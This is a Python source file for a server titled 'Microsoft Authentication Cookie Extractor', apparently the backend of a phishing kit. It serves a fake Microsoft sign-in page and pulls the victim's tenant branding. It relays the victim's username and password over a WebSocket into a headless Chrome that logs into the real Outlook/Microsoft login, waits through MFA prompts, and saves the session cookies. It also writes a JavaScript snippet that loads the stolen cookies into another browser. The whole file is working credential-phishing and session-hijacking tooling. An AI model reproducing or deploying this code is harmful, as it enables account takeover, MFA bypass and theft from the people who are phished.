from flask import Flask, send_from_directory
import os
import threading
import asyncio
import websockets
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from time import sleep
import requests, json, os
import pickle
import base64
from datetime import datetime

# Add Flask app setup
app = Flask(__name__)

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.htm')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

def start_flask():
    port = int(os.environ.get('PORT', 8080))
    print(f"Starting Flask server on port {port}")
    
    # Check if index.html exists
    if not os.path.exists('index.html'):
        print("ERROR: index.html not found! Creating a basic one...")
        # Create a basic index.html if missing
        with open('index.html', 'w') as f:
            f.write("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Microsoft Authentication</title>
            </head>
            <body>
                <h1>Microsoft Authentication Service</h1>
                <p>Server is running successfully!</p>
            </body>
            </html>
            """)
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Add this function to set up Chrome for Railway
def setup_chrome_for_railway():
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--headless')  # Required for server environments
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--remote-debugging-port=9222')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    return chrome_options

def convert_json_cookies_to_js(json_cookies_data):
    """
    Convert JSON cookie format to JavaScript execution format
    Only processes the cookies array, ignoring metadata
    """
    
    # If it's a string, parse it as JSON
    if isinstance(json_cookies_data, str):
        data = json.loads(json_cookies_data)
    else:
        data = json_cookies_data
    
    # Extract cookies array (ignore export_date and total_cookies)
    cookies = data.get('cookies', [])
    
    # Convert to JavaScript format
    js_cookies = []
    for cookie in cookies:
        # Clean domain (remove leading dots)
        domain = cookie.get('domain', '').lstrip('.')
        
        js_cookie = {
            "name": cookie.get('name', ''),
            "path": cookie.get('path', '/').replace('/', r'\/'),  # Escape forward slashes
            "value": cookie.get('value', ''),
            "domain": domain,
            "secure": cookie.get('secure', False),
            "max_age": 31536000,  # 1 year default
            "httponly": cookie.get('httpOnly', False),
            "samesite": cookie.get('sameSite')
        }
        js_cookies.append(js_cookie)
    
    # Generate the JavaScript code
    js_code = f"""(() => {{
        let cookies = {json.dumps(js_cookies, separators=(',', ':'))};
      
        function setCookie(key, value, domain, path, isSecure) {{
          const cookieMaxAge = 'Max-Age=31536000'
      
          if (key.startsWith('__Host')) {{
            console.log('cookies Set', key, value, '!IMPORTANT __Host- prefix: Cookies with names starting with __Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path = /;Secure;SameSite=None';
          }} else if (key.startsWith('__Secure')) {{
            console.log('cookies Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
          }} else {{
            if (isSecure) {{
              console.log('cookies Set', key, value);
              if (window.location.hostname == domain) {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
              }} else {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
              }}
            }} else {{
              console.log('cookies Set', key, value);
              if (window.location.hostname == domain) {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
              }} else {{
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
              }}
            }}
          }}
        }}
        for (let cookie of cookies) {{
          setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
        }}
      }})();"""
    
    return js_code

def mm_1(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_1_v(vf):
    try:
        accept_button = WebDriverWait(vf, 10).until(EC.element_to_be_clickable((By.ID, "acceptButton")))
        accept_button.click()
        sleep(10)
        vf.quit()
    except Exception as e:
        print(f"Error in mm_1_v: {e}")
        try:
            vf.quit()
        except:
            pass

def mm_2(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "i0118Error")))
        return True
    except:
        return False

def mm_3(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        return True
    except:
        return False

def mm_3_v(vf):
    try:
        sleep(20)
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_4(vf):
    try:
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "idSpan_SAOTCAS_DescSessionID")))
        return True
    except:
        return False

def mm_4_v(vf):
    try:
        sleep(20)
        WebDriverWait(vf, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def is_login_successful(driver):
    """Check if login was successful"""
    try:
        current_url = driver.current_url
        print(f"Checking login success. Current URL: {current_url}")
        
        # Check for successful redirects
        if any(x in current_url for x in ["outlook.office365.com", "owa", "mail", "office.com", "microsoftonline.com"]):
            return True
        
        # Check for success indicators in page content
        page_source = driver.page_source.lower()
        if any(x in page_source for x in ["sign out", "logout", "log out", "inbox", "mail", "calendar"]):
            return True
            
        # Check for error indicators
        if any(x in page_source for x in ["error", "invalid", "incorrect", "wrong password"]):
            return False
            
        return False
    except Exception as e:
        print(f"Error checking login status: {e}")
        return False

def save_cookies(driver, session_id):
    """Save cookies to multiple formats including clean JavaScript execution format"""
    try:
        cookies = driver.get_cookies()
        map_dir = os.path.join(os.getcwd(), "map", session_id)
        
        # Save as pickle
        pkl_file = os.path.join(map_dir, "cookies.pkl")
        with open(pkl_file, 'wb') as f:
            pickle.dump(cookies, f)
        
        # Prepare JSON data
        json_ready_cookies = []
        for cookie in cookies:
            json_cookie = cookie.copy()
            for key, value in json_cookie.items():
                if isinstance(value, (bytes, datetime)):
                    json_cookie[key] = str(value)
            json_ready_cookies.append(json_cookie)
        
        # Save as JSON (with metadata)
        json_file = os.path.join(map_dir, "cookies.json")
        json_data_with_metadata = {
            "export_date": datetime.now().isoformat(),
            "total_cookies": len(cookies),
            "cookies": json_ready_cookies
        }
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(json_data_with_metadata, f, indent=2, ensure_ascii=False)
        
        # Convert to JavaScript format (without metadata)
        js_file = os.path.join(map_dir, "cookies_script.js")
        clean_json_data = {"cookies": json_ready_cookies}  # Only cookies, no metadata
        js_code = convert_json_cookies_to_js(clean_json_data)
        
        with open(js_file, 'w', encoding='utf-8') as f:
            f.write(js_code)
        
        # Also create a simple text summary
        summary_file = os.path.join(map_dir, "cookies_summary.txt")
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"Cookie Export Summary\n")
            f.write(f"=====================\n")
            f.write(f"Export Date: {datetime.now().isoformat()}\n")
            f.write(f"Total Cookies: {len(cookies)}\n")
            f.write(f"Domains found:\n")
            
            domains = {}
            for cookie in cookies:
                domain = cookie.get('domain', 'unknown')
                domains[domain] = domains.get(domain, 0) + 1
            
            for domain, count in domains.items():
                f.write(f"  - {domain}: {count} cookies\n")
            
            f.write(f"\nImportant Cookies:\n")
            important_cookies = [c for c in cookies if any(x in c.get('name', '').lower() for x in ['auth', 'token', 'session', 'access', 'refresh', 'login'])]
            for cookie in important_cookies:
                f.write(f"  - {cookie.get('name')} (Domain: {cookie.get('domain')})\n")
        
        print(f"Cookies saved to: {pkl_file}")
        print(f"JSON cookies saved to: {json_file}")
        print(f"JavaScript cookies saved to: {js_file}")
        print(f"Summary saved to: {summary_file}")
        return True
        
    except Exception as e:
        print(f"Error saving cookies: {e}")
        return False

async def handle_websocket(websocket, path=None):
    try:
        ud1 = None
        driver = None
        
        while True:
            ui_1 = await websocket.recv()
            print(f"Received: {ui_1}")
            
            if "ud:" in ui_1:
                parts = ui_1.split(":")
                if len(parts) >= 3:
                    username = parts[1]
                    session_id = parts[2]
                    
                    payload = {"username": username, "isOtherIdpSupported": True}
                    banner = ""
                    print(f"Processing username: {username}")
                    
                    try:
                        response = requests.post("https://login.microsoftonline.com/common/GetCredentialType", json=payload, timeout=30)
                        
                        if response.status_code == 200:
                            try:
                                data = response.json()
                                banner += f"{data.get('IfExistsResult', 'null')}:"
                                banner += f"{data.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('BannerLogo', 'null')}:"
                                banner += f"{data.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('Illustration', 'null')}:"
                                banner += f"{data.get('EstsProperties', {}).get('UserTenantBranding', [{}])[0].get('BackgroundColor', 'null')}"
                            except Exception as e:
                                banner = "null:null:null:null"
                                print(f"Error parsing response: {e}")
                            
                            print(f"Banner response: {banner}")
                            await websocket.send(banner)
                        else:
                            error_msg = f"Request failed. Status code: {response.status_code}"
                            print(error_msg)
                            await websocket.send("error:request_failed")
                            
                    except Exception as e:
                        error_msg = f"Error in API call: {e}"
                        print(error_msg)
                        await websocket.send("error:api_call_failed")
                    
                    ud1 = ui_1
                    
                    # Process browser automation
                    base_dir = os.getcwd()
                    map_dir = os.path.join(base_dir, "map", session_id)
                    storage_dir = os.path.join(base_dir, "Storage", session_id)
                    
                    try:
                        os.makedirs(map_dir, exist_ok=True)
                        os.makedirs(storage_dir, exist_ok=True)
                        print(f"Directories created for session: {session_id}")
                        print(f"Cookies will be stored in: {map_dir}/")
                        print(f"Browser profile will be stored in: {storage_dir}/")
                        
                        # Use the Railway-optimized Chrome setup
                        chrome_options = setup_chrome_for_railway()
                        chrome_options.add_argument(f"user-data-dir={storage_dir}")
                        
                        service = Service(ChromeDriverManager().install())
                        driver = webdriver.Chrome(service=service, options=chrome_options)
                        
                        url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=27773165-9160-1898-04aa-bf3c4164d7f9&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&login_hint={username}&nonce=638588644641353721.6173dd1e-ebed-4c60-b413-fdb5a2238a04&state=DYsxEsAgCMCwXp9DFUHkO1rs2rHfL0Oy5JIAIAdHkGoIhrJ1MxVRIe48Gl1Kg91p417bUW6tuCLi46vP1thmlRTvWd5vlh8&sso_reload=true"
                        driver.get(url)
                        print(f"Browser opened for: {username}")
                        
                        # Wait for page to load
                        await asyncio.sleep(3)
                        
                        # Check if we're already logged in or need to enter password
                        try:
                            # Look for password field
                            password_field = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((By.ID, "i0118"))
                            )
                            print("Password field found, waiting for password...")
                            
                            # Request password from client
                            await websocket.send("need_password")
                            
                            # Wait for password with timeout
                            try:
                                password = await asyncio.wait_for(websocket.recv(), timeout=60.0)
                                print(f"Password received: {password}")
                                
                                # Enter password
                                password_field.clear()
                                password_field.send_keys(password)
                                
                                # Click submit
                                submit_button = WebDriverWait(driver, 10).until(
                                    EC.element_to_be_clickable((By.ID, "idSIButton9"))
                                )
                                submit_button.click()
                                print("Login submitted")
                                
                                # Wait for post-login page and check for errors
                                await asyncio.sleep(5)
                                
                                # Check for password error first
                                if mm_2(driver):
                                    print("Invalid password detected")
                                    await websocket.send("invalid_password")
                                    continue
                                
                                # Wait a bit longer for page to fully load
                                await asyncio.sleep(3)
                                
                                # Check if login was successful
                                if is_login_successful(driver):
                                    print("Login successful!")
                                    # Save cookies in multiple formats
                                    if save_cookies(driver, session_id):
                                        await websocket.send("login_successful:cookies_saved")
                                    else:
                                        await websocket.send("login_successful:cookies_failed")
                                else:
                                    print("Login failed or unknown state")
                                    await websocket.send("login_failed")
                                
                            except asyncio.TimeoutError:
                                await websocket.send("error:password_timeout")
                                print("Password timeout")
                                
                        except Exception as e:
                            print(f"Password field not found or error: {e}")
                            # Check if already logged in
                            if is_login_successful(driver):
                                print("Already logged in!")
                                if save_cookies(driver, session_id):
                                    await websocket.send("already_logged_in:cookies_saved")
                                else:
                                    await websocket.send("already_logged_in:cookies_failed")
                            else:
                                current_url = driver.current_url
                                print(f"Unexpected page state. URL: {current_url}")
                                await websocket.send(f"unexpected_page:{current_url}")
                        
                    except Exception as e:
                        error_msg = f"Browser error: {e}"
                        print(error_msg)
                        await websocket.send("error:browser_error")
                        try:
                            if driver:
                                driver.quit()
                        except:
                            pass
                
                else:
                    print("Invalid format")
                    await websocket.send("error:invalid_format")
                    
            elif "pw:" in ui_1:
                # Handle password responses from client
                password = ui_1.replace("pw:", "")
                print(f"Password received via pw: protocol: {password}")
                
    except websockets.ConnectionClosed:
        print("Connection closed")
        try:
            if driver:
                driver.quit()
        except:
            pass
    except Exception as e:
        print(f"Unexpected error: {e}")
        try:
            if driver:
                driver.quit()
        except:
            pass

async def main():
    # Create base directories
    os.makedirs("map", exist_ok=True)
    os.makedirs("Storage", exist_ok=True)
    print("Microsoft Authentication Cookie Extractor")
    print("========================================")
    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Directories ready")
    print("")
    print("Output Files:")
    print("  - cookies.pkl (binary format for Python)")
    print("  - cookies.json (readable JSON format with metadata)")
    print("  - cookies_script.js (executable JavaScript for browser console)")
    print("  - cookies_summary.txt (summary file)")
    print("")
    print("Storage locations:")
    print(f"  - Cookies: ./map/{{session_id}}/")
    print(f"  - Browser profiles: ./Storage/{{session_id}}/")
    print("")
    
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    print("Starting WebSocket server on port 9013")
    server = await websockets.serve(handle_websocket, "0.0.0.0", 9013)
    print("WebSocket server started successfully")
    
    await server.wait_closed()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
